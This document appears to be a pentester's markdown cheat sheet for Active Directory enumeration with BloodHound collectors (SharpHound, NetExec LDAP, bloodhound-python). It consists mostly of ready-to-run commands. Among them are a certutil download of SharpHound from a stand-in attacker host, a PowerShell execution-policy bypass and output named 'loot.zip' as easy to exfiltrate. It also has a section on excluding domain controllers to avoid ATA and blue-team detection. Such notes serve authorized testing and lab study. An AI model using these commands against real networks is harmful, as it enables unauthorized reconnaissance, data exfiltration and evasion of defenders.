#AD_Bloohdhound-Enumeration
# <span style="color:#FF5555">Using Sharphound.exe :</span>

#### <span style="color:#FFB86C">Check Architecture</span>

```powershell
# In powershell
$env:PROCESSOR_ARCHITECTURE
# OR
[System.Environment]::Is64BitOperatingSystem
# OR
[System.Environment]::Is64BitProcess

```
- `AMD64` / `x64` / `64-bit` → normal 64-bit Windows (99% cases)

Then go to the https://github.com/SpecterOps/SharpHound/releases?page=4
official page to download the exe suitable to system arch
#### <span style="color:#FFB86C">Enable Sharp-Hound and execute</span>
```bash
# Download SharpHound (the data collector)
certutil -urlcache -split -f http://$ATTACKER_IP:8000/SharpHound.exe SharpHound.exe

# Basic Collection t will make a zip
.\SharpHound.exe -c All
```


___
# <span style="color:#FF5555">Using LDAP :</span>

```bash
# it will create a zip
nxc ldap $DC_IP -u "" -p "" --bloodhound --collection All --dns-server $DC_IP
```

___
# <span style="color:#FF5555">Using Bloodhound python :</span>

```bash
source ~/venv/bin/activate
pip install bloodhound
bloodhound-python -c All -u '' -p '' -d $DOMAIN -ns $DC_IP
```

____
### <span style="color:#50FA7B">Using SharpHound.PS1</span>

```bash
# Start PowerShell with execution bypass
# -ep bypass = Bypasses PowerShell's security restrictions (allows running unsigned scripts)
powershell -ep bypass

# Load SharpHound
. .\SharpHound.ps1

# Collect ALL Active Directory data and save to zip file
# -CollectionMethod All      = Groups, users, computers, ACLs, sessions, SPNs, trusts
# -Domain $DOMAIN            = Target domain (only collects from this domain)
# -ZipFileName loot.zip      = Output file name (easy to exfiltrate and import to BloodHound)
Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -ZipFileName loot.zip
```

#### <span style="color:#FFB86C">To avoid detection like ATA</span>
```powershell
# Why exclude DCs?
# - Domain Controllers are heavily monitored by Blue Teams
# - Microsoft ATA (Advanced Threat Analytics) specifically alerts on DC enumeration
# - DCs have advanced logging (Event ID 4662, 4663 for directory access)
# - Any unusual LDAP query to a DC triggers high-severity alert
Invoke-BloodHound -CollectionMethod All -ExcludeDC
```

____

# <span style="color:#FF5555">Start neo4j and BloodHound UI on kali machine and load the zip/json files</span>

```shell
# Start BloodHound on Kali to analyze
sudo neo4j console
bloodhound &
```
